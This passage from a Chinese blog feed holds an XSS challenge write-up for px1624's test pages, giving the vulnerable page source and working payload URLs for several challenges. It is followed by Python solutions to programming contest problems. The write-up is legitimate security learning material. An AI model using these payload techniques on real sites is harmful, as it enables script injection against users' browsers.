`in`和`instanceof`[运算符](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6)</span><br><span class="line">URL: `http://px1624.sinaapp.com/test/xsstest4/?px=%27%20in%20alert(1)%20in%20%27`</span><br><span class="line"></span><br><span class="line">## 5</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest5/  </span><br><span class="line">进去直接跳转到`http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass~`</span><br><span class="line">没有过滤，输入标签不解析，就知道有问题了，一看`Content-Type`果然  </span><br><span class="line">![](https://i.loli.net/2020/06/25/OmUDzBlkXoTEptx.png)  </span><br><span class="line">这里是不会解析的，再回去看一下请求包  </span><br><span class="line">``` html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=&quot;../jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;Script src=&quot;./index.js&quot;&gt;&lt;/Script&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var orguin = $.Tjs_Get(&apos;uin&apos;);</span><br><span class="line">var pagenum= $.Tjs_Get(&apos;pn&apos;);</span><br><span class="line">if(orguin&lt;=0) window.location=&quot;./user.php?callback=Give me xss bypass~&quot;;</span><br><span class="line">document.write(&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;http://px1624.sinaapp.com/&apos;+orguin+&apos;?&apos;+pagenum+&apos;&quot;&gt;&lt;\/script&gt;&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Give me xss bypass 5~</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><p>翻一下<code>index.js</code>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// 得到地址栏中的参数值 变量分大小写</span><br><span class="line">Tjs_Get:function(parmtname)&#123;</span><br><span class="line">//var SERVER_TEMP= $.Tjs_HtmlEncode(window.location.search.replace(/.*\?/,&quot;&quot;)); //HtmlEncode 进行安全验证</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var sl = location.href.indexOf(&apos;&amp;&apos;);</span><br><span class="line">var hl = location.href.indexOf(&apos;#&apos;);</span><br><span class="line">var str = &apos;&apos;;</span><br><span class="line">if ((sl &lt; 0 || sl &gt; hl) &amp;&amp; hl &gt; 0) str = location.hash.substr(1);</span><br><span class="line">else str = location.search.substr(1);</span><br><span class="line"></span><br><span class="line">str=str.replace(/%/g,&quot;&quot;);</span><br><span class="line">//var SERVER_TEMP = str;</span><br><span class="line">var SERVER_TEMP= $.Tjs_HtmlEncode(str.replace(/.*\?/,&quot;&quot;)); //HtmlEncode 进行安全验证</span><br><span class="line"></span><br><span class="line">var PAGE_PARMT_ARRAY= SERVER_TEMP.split(&quot;&amp;amp;&quot;);</span><br><span class="line">if(PAGE_PARMT_ARRAY.length==0) return &quot;&quot;;</span><br><span class="line">var value=&quot;&quot;;</span><br><span class="line">for(var i=0;i&lt;PAGE_PARMT_ARRAY.length;i++)&#123;</span><br><span class="line">if(PAGE_PARMT_ARRAY[i]==&quot;&quot;) continue;</span><br><span class="line">var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;));</span><br><span class="line">if(GETname == parmtname)&#123;</span><br><span class="line">value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;)+1),PAGE_PARMT_ARRAY[i].length);</span><br><span class="line">return value;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;&quot;;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">//html正文编码：对需要出现在HTML正文里(除了HTML属性外)的不信任输入进行编码</span><br><span class="line">Tjs_HtmlEncode:function (sStr)</span><br><span class="line">&#123;</span><br><span class="line">sStr = sStr.replace(/&amp;/g,&quot;&amp;amp;&quot;);</span><br><span class="line">sStr = sStr.replace(/&gt;/g,&quot;&amp;gt;&quot;);</span><br><span class="line">sStr = sStr.replace(/&lt;/g,&quot;&amp;lt;&quot;);</span><br><span class="line">sStr = sStr.replace(/&quot;/g,&quot;&amp;quot;&quot;);</span><br><span class="line">sStr = sStr.replace(/&apos;/g,&quot;&amp;#39;&quot;);</span><br><span class="line">return sStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了双引号且过滤了<code>%</code>无法编码绕过，既然无法逃逸出src属性，那就只能控制加载的js了，刚好利用前面的那个接口<br>URL: <code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code>  </p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><a href="http://px1624.sinaapp.com/test/xsstest6/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback="</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;script type="text/javascript" src="http://px1624.sinaapp.com/pxpath/'</span>+<span class="built_in">decodeURIComponent</span>(orguin)+<span class="string">'&amp;'</span>+<span class="built_in">Math</span>.random()+<span class="string">'"&gt;&lt;\/script&gt;'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 6~【任意浏览器弹1就算通过】</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也是前一题的加强版，不同的是输出没有了问号，导致无法正确向<code>user.php</code>传递<code>callback</code>参数，且<code>user.php</code>的<code>callback</code>限制最长七位<br>这里比较明显的多了一行<br><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</code><br>这说明答案可能和编码有关?<br>没解出来<br>做等wp~  </p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><a href="http://px1624.sinaapp.com/test/xsstest7/?px=payload" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7/?px=payload</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'payload'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>payload<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="string">'px'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个输出点，JS内的特殊字符前面加<code>\</code>进行转移，另一个转义了尖括号，但是<code>\</code>本身是没有转义的，于是可以用<code>\</code>转义<code>&#39;</code>的反斜线从而进行逃逸<br>但是这样既没有办法闭合也没有办法注释掉后面的单引号<br><img src="https://i.loli.net/2020/06/26/KXRCEZ531SvFTzG.png" alt><br>用模板字符串试一下结果<br><code>SyntaxError: `` literal not terminated before end of script</code><br>看来模板字符串不能跨script，后来用注释试了一下也不行，就跑去看wp了，wp也是用注释做的，不过里面又内嵌了一个<code>&lt;script&gt;</code><br>详见<a href="https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/" target="_blank" rel="noopener">HTML5 + JS Escapers</a><br>URL: <code>http://px1624.sinaapp.com/test/xsstest7/?px=\%27%20*%20`%20*%20alert(1)//%3C!--%20\%3Cscript%20%3E</code></p><p>后面两题都是第八题的加强版，都做不出来，太难了我…<br>就解了前三题    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天看先知看到了这个&lt;a href=&quot;https://xz.aliyun.com/t/7909&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7909&lt;/a&gt;&lt;br&gt;顺便玩了一下，做下记录  &lt;/p&gt;
&lt;h2
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2020年远光杯粤澳计算机程序设计大赛网络资格赛</title>
    <link href="https://p7e4.js.org/2020/04/25/2020ygb-acm/"/>
    <id>https://p7e4.js.org/2020/04/25/2020ygb-acm/</id>
    <published>2020-04-25T20:32:00.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Alice的秘密"><a href="#Alice的秘密" class="headerlink" title="Alice的秘密"></a>Alice的秘密</h3><p><img src="https://i.loli.net/2020/04/25/mnPdtkXWxGI6AqK.png" alt="Alice的秘密.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">sys.stdout = codecs.getwriter(<span class="string">"utf-8"</span>)(sys.stdout.detach())</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">n = input()</span><br><span class="line">s = input()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> len(s) &gt; <span class="number">128</span>:</span><br><span class="line">print(<span class="string">"none"</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> len(n) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="number">1900</span> &lt;= datetime.strptime(n, <span class="string">'%Y%m%d'</span>).year &lt;= <span class="number">2020</span>:</span><br><span class="line">print(<span class="string">"none"</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">print(<span class="string">"none"</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">while</span> int(n) &gt;= <span class="number">10</span>:</span><br><span class="line">n = str(sum(map(int, list(n))))</span><br><span class="line">n = int(n)</span><br><span class="line">an = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">if</span> i&gt;=<span class="string">'a'</span> <span class="keyword">and</span> i&lt;=<span class="string">'z'</span>:</span><br><span class="line">i=ord(i)</span><br><span class="line">i = (i + n - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">i = chr(i)</span><br><span class="line"><span class="keyword">elif</span> i &gt;= <span class="string">"A"</span> <span class="keyword">and</span> i &lt;= <span class="string">"Z"</span>:</span><br><span class="line">i = ord(i)</span><br><span class="line">i = (i + n - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">i = chr(i)</span><br><span class="line"><span class="keyword">elif</span> ord(i) == <span class="number">32</span>:</span><br><span class="line">i = <span class="string">"#"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">an += i</span><br><span class="line"><span class="keyword">if</span> len(an) == len(s):</span><br><span class="line">print(an)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"none"</span>)</span><br></pre></td></tr></table></figure><h3 id="今天星期几"><a href="#今天星期几" class="headerlink" title="今天星期几"></a>今天星期几</h3><p><img src="https://i.loli.net/2020/04/25/OoBxzj6EMyPFdTX.png" alt="今天星期几.png"><br>需要注意年是不合法的y(2000&lt;=y&lt;=1000000)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">sys.stdout = codecs.getwriter(<span class="string">"utf-8"</span>)(sys.stdout.detach())</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">y, m, d = map(int, input().split())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> y &gt;= <span class="number">10000</span>:</span><br><span class="line">x = (y // <span class="number">2000</span> - <span class="number">2</span>) * <span class="number">730485</span></span><br><span class="line">y %= <span class="number">2000</span> + <span class="number">4000</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">firstDay = datetime(<span class="number">2000</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">endDay = datetime(y,m,d)</span><br><span class="line">x += (endDay - firstDay).days + <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">print((x // <span class="number">4</span>) - <span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(x // <span class="number">4</span> , x % <span class="number">4</span>)</span><br></pre></td></tr></table></figure><h3 id="小明的英文作业"><a href="#小明的英文作业" class="headerlink" title="小明的英文作业"></a>小明的英文作业</h3><p><img src="https://i.loli.net/2020/04/25/9aE57k4XYGqbmA2.png" alt="小明的英文作业.png"><br>一开始以为每组数据是要合在一起的，浪费好多时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s = input()</span><br><span class="line"><span class="keyword">if</span> s != <span class="string">"#"</span>:</span><br><span class="line">a = s.split()</span><br><span class="line">an = []</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> Counter(a).items():</span><br><span class="line"><span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">an.append(k)</span><br><span class="line">dl = len(a)</span><br><span class="line">ds = len(an)</span><br><span class="line"><span class="keyword">if</span> ds * <span class="number">2</span> &lt; dl <span class="keyword">or</span> dl &gt; <span class="number">100</span>:</span><br><span class="line">print(<span class="string">"no"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"yes"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="分三排"><a href="#分三排" class="headerlink" title="分三排"></a>分三排</h3><p><img src="https://i.loli.net/2020/04/25/TNuSPQE96M1t4iO.png" alt="分三排.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s = int(input())</span><br><span class="line">data = input().split()</span><br><span class="line">d2 = []</span><br><span class="line">d1 = []</span><br><span class="line">d0 = []</span><br><span class="line">t = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">if</span> t % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">d0.append(i)</span><br><span class="line"><span class="keyword">elif</span> t % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">d2.append(i)</span><br><span class="line"><span class="keyword">elif</span> t % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">d1.append(i)</span><br><span class="line">t += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">" "</span>.join(d2))</span><br><span class="line">print(<span class="string">" "</span>.join(d1))</span><br><span class="line">print(<span class="string">" "</span>.join(d0))</span><br></pre></td></tr></table></figure><h2 id="击中目标"><a href="#击中目标" class="headerlink" title="击中目标"></a>击中目标</h2><p><img src="https://i.loli.net/2020/04/25/QmKzwN4hrBf5coM.png" alt="击中目标1.png"><br><img src="https://i.loli.net/2020/04/25/ugmyBbXcrUD3soN.png" alt="击中目标2.png"><br>一看就是难题，没做</p><h2 id="序列计数"><a href="#序列计数" class="headerlink" title="序列计数"></a>序列计数</h2><p><img src="https://i.loli.net/2020/04/25/KhT9PpAr3LFiRMl.png" alt="序列计数.png"><br>不会</p><h3 id="强迫症"><a href="#强迫症" class="headerlink" title="强迫症"></a>强迫症</h3><p><img src="https://i.loli.net/2020/04/25/qBdYuKVTX6rOMGF.png" alt="强迫症.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">s = input()</span><br><span class="line">data = map(int, input().split())</span><br><span class="line">c = Counter(data)</span><br><span class="line">print(c.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h2 id="新型冠状爱情病毒"><a href="#新型冠状爱情病毒" class="headerlink" title="新型冠状爱情病毒"></a>新型冠状爱情病毒</h2><p><img src="https://i.loli.net/2020/04/25/JRjwbnOs51eDx79.png" alt="新型冠状爱情病毒2.png"><br><img src="https://i.loli.net/2020/04/25/taPvL5czgfW7D8K.png" alt="新型冠状爱情病毒1.png"><br>不会+1</p><h3 id="期末表彰"><a href="#期末表彰" class="headerlink" title="期末表彰"></a>期末表彰</h3><p><img src="https://i.loli.net/2020/04/25/qAImvlVGEeuPxYk.png" alt="期末表彰.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s = int(input())</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s):</span><br><span class="line">f = &#123;<span class="string">"num"</span>: i + <span class="number">1</span>&#125;</span><br><span class="line">f[<span class="string">"c"</span>], f[<span class="string">"math"</span>], f[<span class="string">"eng"</span>] = map(int, input().split())</span><br><span class="line">f[<span class="string">"sum"</span>] = f[<span class="string">"c"</span>] + f[<span class="string">"math"</span>] + f[<span class="string">"eng"</span>]</span><br><span class="line">data.append(f)</span><br><span class="line"></span><br><span class="line">an = sorted(data, key = <span class="keyword">lambda</span> i: (i[<span class="string">'sum'</span>], i[<span class="string">'c'</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">pr = [str(an[i][<span class="string">"num"</span>]), str(an[i][<span class="string">"c"</span>]), str(an[i][<span class="string">"math"</span>]), str(an[i][<span class="string">"eng"</span>])]</span><br><span class="line">print(<span class="string">" "</span>.join(pr))</span><br></pre></td></tr></table></figure><h2 id="最小特征"><a href="#最小特征" class="headerlink" title="最小特征"></a>最小特征</h2><p><img src="https://i.loli.net/2020/04/25/frXb65yG2hS7LVj.png" alt="最小特征.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">x = int(input())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">s = list(map(int, list(input())))</span><br><span class="line"></span><br><span class="line">data = [s[<span class="number">0</span>:<span class="number">3</span>],s[<span class="number">3</span>:<span class="number">6</span>],s[<span class="number">6</span>:<span class="number">9</span>]]</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> cs <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">l = &#123;&#125;</span><br><span class="line">l[<span class="number">1</span>] = data[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">l[<span class="number">2</span>] = data[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">l[<span class="number">3</span>] = data[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">l[<span class="number">4</span>] = data[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">l[<span class="number">5</span>] = data[<span class="number">2</span>][<span class="number">2</span>]</span><br><span class="line">l[<span class="number">6</span>] = data[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line">l[<span class="number">7</span>] = data[<span class="number">2</span>][<span class="number">0</span>]</span><br><span class="line">l[<span class="number">8</span>] = data[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">c = data[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">an = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">an += (c ^ l[k]) * int(math.pow(<span class="number">2</span>, <span class="number">8</span>-k))</span><br><span class="line">ans.append(an)</span><br><span class="line">data = list(zip(*data[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line">print(min(ans))</span><br></pre></td></tr></table></figure><p>最后赶的一题，可惜有一个样例超时了</p><h2 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h2><p><img src="https://i.loli.net/2020/04/25/OX3G2h86FkMmVod.png" alt="项目管理.png"></p><h2 id="捕鱼达人"><a href="#捕鱼达人" class="headerlink" title="捕鱼达人"></a>捕鱼达人</h2><p><img src="https://i.loli.net/2020/04/25/nW4ILlSN8hzGobR.png" alt="捕鱼达人.png"></p><h2 id="排除危险"><a href="#排除危险" class="headerlink" title="排除危险"></a>排除危险</h2><p><img src="https://i.loli.net/2020/04/25/TLvcPpXq7rdNC2F.png" alt="排除危险.png"></p><h2 id="图像编码问题"><a href="#图像编码问题" class="headerlink" title="图像编码问题"></a>图像编码问题</h2><p><img src="https://i.loli.net/2020/04/25/SyHlq9JrgbNhVK3.png" alt="图像编码问题.png"></p><h2 id="军训值日生"><a href="#军训值日生" class="headerlink" title="军训值日生"></a>军训值日生</h2><p><img src="https://i.loli.net/2020/04/25/I7PX8tFD1iAsaKw.png" alt="军训值日生.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">sys.stdout = codecs.getwriter(<span class="string">"utf-8"</span>)(sys.stdout.detach())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">n = int(input())</span><br><span class="line">mi = list(map(int, input().split()))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mi.sort()</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">a = mi.pop(<span class="number">0</span>)</span><br><span class="line">c += mi[<span class="number">0</span>] * a</span><br><span class="line">mi[<span class="number">0</span>] += a</span><br><span 